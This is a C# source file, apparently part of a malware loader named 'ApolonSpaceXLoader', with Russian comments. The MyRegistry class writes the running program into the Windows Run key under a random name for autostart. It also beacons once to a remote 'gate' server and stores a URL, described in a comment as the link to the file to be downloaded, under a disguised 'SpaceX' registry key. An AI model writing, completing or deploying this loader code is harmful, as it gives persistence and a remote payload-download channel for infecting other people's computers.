namespace ApolonSpaceXLoader
{
    using Microsoft.Win32;
    using System.Net;
    using System.Windows.Forms;

    class MyRegistry
    {
        private static string name = Helper.RandomID(6);
                
        public static void Check() //Проверка на реестр
        {
            try
            {
                using (RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\"))
                {
                    if (ProgramFolder != null)
                    {}
                    else
                    {
                        SetFirstSettings();
                        AR();
                    }
                }
            }
            catch { }
        }

        private static void AR() // автозапуск
        {
            using (RegistryKey reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\"))
            {
                string ExePath = Application.ExecutablePath;
                reg.SetValue(name, ExePath);
            }
        }

        private static void SetFirstSettings() // устанавливаем значения в реестре
        {
            using (RegistryKey CreateRegFolder = Registry.CurrentUser.CreateSubKey(@"Software\SpaceX\"))
            {
                CreateRegFolder.SetValue("URL", ""); // тут будет наша ссылка  на скачиваемый файл
                CreateRegFolder?.SetValue("GATE", "NO");
                if (CreateRegFolder.GetValue("GATE").ToString() != "YES") // проверка на отправку на гейт
                {
                    HttpWebRequest.Create(Program.Gate).GetResponse();
                    CreateRegFolder.DeleteValue("GATE");
                    CreateRegFolder.SetValue("GATE", "YES"); // меняем значение
                }
            }
        }

        public static void SetURL(string URL) // устанавливаем ссылку в реестре
        {
            using (RegistryKey CreateRegFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\", true))
            {
                CreateRegFolder.DeleteValue("URL");
                CreateRegFolder.SetValue("URL", URL);
            }
        }

        public static string GetURL() // получаем ссылку из реестре
        {
            string url = null;
            using (RegistryKey ProgramFolder = Registry.CurrentUser.OpenSubKey(@"Software\SpaceX\"))
            {
                if (ProgramFolder != null)
                {
                    url = ProgramFolder.GetValue("URL").ToString();
                }
            }
            return url;
        }
    }
}
